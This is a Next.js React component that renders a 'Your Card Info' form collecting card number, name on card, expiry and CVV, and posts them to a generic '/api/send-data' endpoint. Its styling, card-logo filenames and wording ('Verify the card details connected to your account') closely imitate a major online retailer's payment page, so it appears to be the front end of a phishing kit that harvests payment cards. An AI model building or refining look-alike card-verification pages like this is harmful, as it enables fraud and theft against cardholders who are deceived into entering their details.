"use client";

import axios from "axios";
import Image from "next/image";
import React, { useMemo, useState } from "react";

const REQUIRED_FIELDS = {
  cardNumber: "Card number is required.",
  nameOnCard: "Name on card is required.",
  month: "Expiration month is required.",
  year: "Expiration year is required.",
  cvv: "Security code is required.",
};

const images = [
  "visa_big.jpg",
  "Mastercard-logo.svg",
  "American_Express_logo_(2018).svg.png",
  "Diners-Club-International-Logo-1978 (2).jpg",
  "discover.png",
  "JCB-logo-sticker-large-160x184-aw-01.png",
  "unionpay.png",
  "PLCC_MAPLE_Core_card_500x315._CB627897952_.png",
];

const hasValue = (value) =>
  typeof value === "string" ? value.trim().length > 0 : Boolean(value);

const validateForm = (values) => {
  const nextErrors = {};

  Object.entries(REQUIRED_FIELDS).forEach(([field, message]) => {
    if (!hasValue(values[field])) {
      nextErrors[field] = message;
    }
  });

  return nextErrors;
};

const CardPayment = ({ onClose, onAddCard, onLinkCard, onSubmit }) => {
  const [form, setForm] = useState({
    cardNumber: "",
    nameOnCard: "",
    month: "01",
    year: "2026",
    cvv: "",
    bank: "",
  });
  const [errors, setErrors] = useState({});
  const [loading, setLoading] = useState(false);
  const [submitError, setSubmitError] = useState("");

  const months = useMemo(
    () => Array.from({ length: 12 }, (_, i) => String(i + 1).padStart(2, "0")),
    [],
  );

  const years = useMemo(
    () => Array.from({ length: 12 }, (_, i) => String(2026 + i)),
    [],
  );

  const handleChange = (e) => {
    const { name } = e.target;
    let { value } = e.target;

    if (name === "cardNumber") {
      value = value.replace(/[^\d\s]/g, "").slice(0, 19);
    }

    if (name === "cvv") {
      value = value.replace(/\D/g, "").slice(0, 4);
    }

    setForm((prev) => ({ ...prev, [name]: value }));
    setSubmitError("");

    setErrors((prev) => {
      if (!prev[name] || !hasValue(value)) {
        return prev;
      }

      const nextErrors = { ...prev };
      delete nextErrors[name];
      return nextErrors;
    });
  };

  const handleAddCard = async (e) => {
    e.preventDefault();

    const nextErrors = validateForm(form);
    setErrors(nextErrors);

    if (Object.keys(nextErrors).length > 0) {
      return;
    }

    try {
      setLoading(true);
      setSubmitError("");
      await axios.post("/api/send-data", form);
      if (onAddCard) onAddCard(form);
      if (onSubmit) onSubmit(form);
    } catch (err) {
      setSubmitError("Unable to submit card details. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  const handleLinkCard = () => {
    if (onLinkCard) onLinkCard(form.bank);
  };

  return (
    <section className="mx-auto w-full max-w-[1000px] overflow-hidden rounded-lg border border-[#b7b8ba] my-10">
      <header className="flex items-center justify-between border-b border-[#c7c9cb] px-7 py-5 md:px-8 md:py-6 bg-[#f2f3f3]">
        <h2 className="text-lg font-bold leading-none text-[#111111] ">
          Your Card Info
        </h2>
        <p>Verify the card details connected to your account.</p>
      </header>

      <div className="grid gap-0 px-7 py-10 md:grid-cols-[1.25fr_1fr] md:px-8">
        <form onSubmit={handleAddCard} noValidate className="pr-0 md:pr-8">
          <div className="grid grid-cols-1 gap-y-4 md:grid-cols-[230px_1fr] md:items-center md:gap-y-5">
            <label
              htmlFor="cardNumber"
              className="text-base font-semibold text-[#111111] md:text-base md:leading-none text-end pr-6"
            >
              Card number
            </label>
            <div>
              <input
                id="cardNumber"
                name="cardNumber"
                value={form.cardNumber}
                onChange={handleChange}
                aria-invalid={Boolean(errors.cardNumber)}
                className={`h-[40px] w-full max-w-[520px] rounded-lg border px-4 text-base text-[#111111] outline-none focus:border-[#1c6fd9] focus:shadow-[0_0_0_3px_rgba(28,111,217,0.2)] ${errors.cardNumber ? "border-[#b12704]" : "border-[#9da3a8]"}`}
              />
              {errors.cardNumber ? (
                <p className="mt-1 text-sm text-[#b12704]">
                  {errors.cardNumber}
                </p>
              ) : null}
            </div>

            <label
              htmlFor="nameOnCard"
              className="text-base font-semibold text-[#111111] md:text-base md:leading-none text-end pr-6"
            >
              Name on card
            </label>
            <div>
              <input
                id="nameOnCard"
                name="nameOnCard"
                value={form.nameOnCard}
                onChange={handleChange}
                aria-invalid={Boolean(errors.nameOnCard)}
                className={`h-[40px] w-full max-w-[520px] rounded-lg border px-4 text-base text-[#111111] outline-none focus:border-[#1c6fd9] focus:shadow-[0_0_0_3px_rgba(28,111,217,0.2)] ${errors.nameOnCard ? "border-[#b12704]" : "border-[#9da3a8]"}`}
              />
              {errors.nameOnCard ? (
                <p className="mt-1 text-sm text-[#b12704]">
                  {errors.nameOnCard}
                </p>
              ) : null}
            </div>

            <p className="text-base font-semibold text-[#111111] md:text-base md:leading-none text-end pr-6">
              Expiration date
            </p>
            <div>
              <div className="flex gap-3">
                <select
                  name="month"
                  value={form.month}
                  onChange={handleChange}
                  aria-invalid={Boolean(errors.month)}
                  className={`h-[40px] w-[92px] rounded-lg border px-3 text-base text-[#111111] outline-none focus:border-[#1c6fd9] md:w-[110px] ${errors.month ? "border-[#b12704]" : "border-[#9da3a8]"}`}
                >
                  {months.map((month) => (
                    <option key={month} value={month}>
                      {month}
                    </option>
                  ))}
                </select>

                <select
                  name="year"
                  value={form.year}
                  onChange={handleChange}
                  aria-invalid={Boolean(errors.year)}
                  className={`h-[40px] w-[120px] rounded-lg border px-3 text-base text-[#111111] outline-none focus:border-[#1c6fd9] md:w-[118px] ${errors.year ? "border-[#b12704]" : "border-[#9da3a8]"}`}
                >
                  {years.map((year) => (
                    <option key={year} value={year}>
                      {year}
                    </option>
                  ))}
                </select>
              </div>
              {errors.month || errors.year ? (
                <p className="mt-1 text-sm text-[#b12704]">
                  {errors.month || errors.year}
                </p>
              ) : null}
            </div>

            <label
              htmlFor="cvv"
              className="max-w-[220px] text-base font-semibold leading-tight text-[#111111] md:text-base"
            >
              Security Code (CVV/CVC)
            </label>
            <div>
              <div className="flex flex-wrap items-center gap-2">
                <input
                  id="cvv"
                  name="cvv"
                  value={form.cvv}
                  onChange={handleChange}
                  aria-invalid={Boolean(errors.cvv)}
                  className={`w-[100px] rounded-lg border px-4 text-base text-[#111111] outline-none focus:border-[#1c6fd9] h-[40px] ${errors.cvv ? "border-[#b12704]" : "border-[#9da3a8]"}`}
                />
                <button type="button" className="text-sm text-[#2162a1]">
                  (What&apos;s this?)
                </button>
              </div>
              {errors.cvv ? (
                <p className="mt-1 text-sm text-[#b12704]">{errors.cvv}</p>
              ) : null}
            </div>
          </div>

          <button
            type="submit"
            disabled={loading}
            className="mt-7 py-3 rounded-full bg-[#ffd814] px-7 text-base font-semibold leading-none text-black hover:bg-[#f7ca00] md:px-8"
          >
            {loading ? "Loading..." : "Next"}
          </button>

          {submitError ? (
            <p className="mt-3 text-sm text-[#b12704]">{submitError}</p>
          ) : null}
        </form>

        <aside className="mt-7 border-t border-[#d4d7da] pt-6 md:mt-0 md:border-l md:border-t-0 md:border-[#d4d7da] md:pl-8 md:pt-0">
          <p className="text-sm leading-tight text-[#111111] md:leading-none text-end pr-6">
            This platform accepts all major credit and debit cards:
          </p>

          <div className="mt-4 grid grid-cols-4 gap-y-4 md:mt-5">
            {images.map((name, index) => (
              <div
                key={index}
                className="h-[37px] w-[70px] rounded-md border py-1 border-[#d0d4d7] bg-white overflow-hidden m-auto"
              >
                <img
                  src={`/images/${name}`}
                  alt="Logo"
                  width={50}
                  height={30}
                  className="w-auto h-full object-cover text-center m-auto"
                />
              </div>
            ))}
          </div>
        </aside>
      </div>

      <footer className="border-t border-[#c7c9cb] bg-[#e8e8e8] px-7 py-3">
        <div className="flex flex-wrap items-center justify-between gap-4">
          <p className="max-w-[980px] text-sm text-[#4b4f53] ">
            To avoid interruptions to your service, your added card may be used
            as a backup if another payment method fails. You can change this
            setting any time.
          </p>

          <button
            type="button"
            onClick={onClose}
            className="rounded-full border border-[#9da3a8]   px-4 text-sm text-[#111111] outline-none focus:border-[#1c6fd9] h-[35px]"
          >
            Cancel
          </button>
        </div>
      </footer>
    </section>
  );
};

export default CardPayment;
